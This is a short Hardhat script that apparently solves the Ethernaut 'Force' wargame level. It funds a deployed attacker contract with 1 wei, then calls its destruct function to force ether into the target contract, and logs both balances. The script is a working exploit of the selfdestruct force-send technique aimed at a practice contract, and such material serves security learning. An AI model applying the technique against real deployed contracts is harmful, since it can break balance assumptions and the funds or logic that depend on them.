const { ethers, network } = require("hardhat");

const Hack = require(`../../deployments/${network.name}/ForceAttacker.json`);
const Force = require(`../../deployments/${network.name}/Force.json`);

async function main() {
    let [owner] = await ethers.getSigners();

    const Abi = [
      "function consecutiveWins() external view returns (uint)",
      "function expFlip() external view returns (address)",
      "function FACTOR() external view returns (uint)",
      "function exploit(address) external",
      "function destruct(address) external",
      "function attack(address) external",
      "function hack() external"
    ];

    let hack = await new ethers.Contract(Hack.address, Abi, owner);

    let provider = owner.provider
    await owner.sendTransaction({from: owner.address,to:hack.address, value:1, gasLimit: 10000000})
    console.log(await provider.getBalance(hack.address))
    await hack.destruct(Force.address)
    console.log(await provider.getBalance(Force.address))
}

main()
    .then(() =>process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
